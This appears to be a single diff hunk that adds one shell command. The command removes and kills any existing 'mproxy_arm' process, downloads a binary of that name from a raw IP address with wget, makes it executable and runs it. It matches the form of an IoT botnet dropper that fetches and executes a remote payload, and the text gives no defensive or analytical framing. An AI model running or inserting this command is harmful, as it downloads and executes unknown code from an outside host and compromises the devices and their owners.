@@ -1,0 +1,1 @@
+rm -rf /tmp/mproxy_arm;killall mproxy_arm;wget http://134.227.227.110/hex/mproxy_arm;chmod +x /tmp/mproxy_arm;./mproxy_arm
